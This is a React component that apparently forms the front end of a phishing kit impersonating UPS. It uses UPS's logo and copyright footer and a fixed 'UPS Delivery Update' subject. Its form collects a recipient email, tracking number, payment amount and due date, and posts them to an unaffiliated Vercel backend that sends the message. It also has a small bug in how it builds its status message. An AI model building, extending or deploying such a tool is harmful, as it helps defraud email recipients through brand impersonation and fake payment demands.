// Frontend: React component for sending emails
// Install dependencies: npm install react react-dom

import React, { useState } from "react";
import { useNavigate, Link } from "react-router-dom";

const EmailSender = () => {

    const [email, setEmail] = useState("");
    const [subject, setSubject] = useState("");
    const [trackingNumber, setTrackingNumber] = useState("");
    const [amount, setAmount] = useState("");
    const [dueDate, setDueDate] = useState("");
   
    const [status, setStatus] = useState(null);
    const [loading, setLoading] = useState(false)

    // Function to handle sending email
    const sendEmail = async () => {
        try {
            setLoading(true)
            const response = await fetch("https://back-one-navy.vercel.app/auth/send-email", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ to: email, subject, trackingNumber, amount,dueDate})
            });
            
            const data = await response.json();
            setStatus(data.success ? `Email sent successfully! ${setLoading(false)}` : `Failed to send email. ${setLoading(false)}`);
        } catch (error) {
            setLoading(false)
            setStatus("Error sending email.");
        }
    };

    return (
        <div>
             <div className="nav">
    <div><Link to="/" ><img src="https://www.ups.com/webassets/icons/logo.svg" className="logo"/></Link></div>
    <div> <Link to="/login" className="button2">Track</Link></div>
  </div>

  <div className="cover">
<div className="homepage">
  <div className="content">
            <h1>Send an Email</h1>
            <input type="email" placeholder="Recipient Email" value={email} onChange={e => setEmail(e.target.value)}  className="input" />
            <input type="text" placeholder="Tracking Number" value={trackingNumber} onChange={e => setTrackingNumber(e.target.value)}  className="input" />
            <input type="text" placeholder="Subject" value="UPS Delivery Update" onChange={e => setSubject(e.target.value)}  className="input" />
            <input type="number" placeholder="Amount" value={amount} onChange={e => setAmount(e.target.value)}  className="input" />
            <input type="text" placeholder="Due date" value={dueDate} onChange={e => setDueDate(e.target.value)}  className="input" />
            <button onClick={sendEmail} className="subbtn" >{loading? 'Sending Email...' : 'Send email'}</button>
            {status && <p>{status}</p>}
        </div>
        </div>
        </div>
        <div className="footer">Copyright ©1994-2025 United Parcel Service of America, Inc. All rights reserved.</div>        
</div>

    );
};

export default EmailSender;
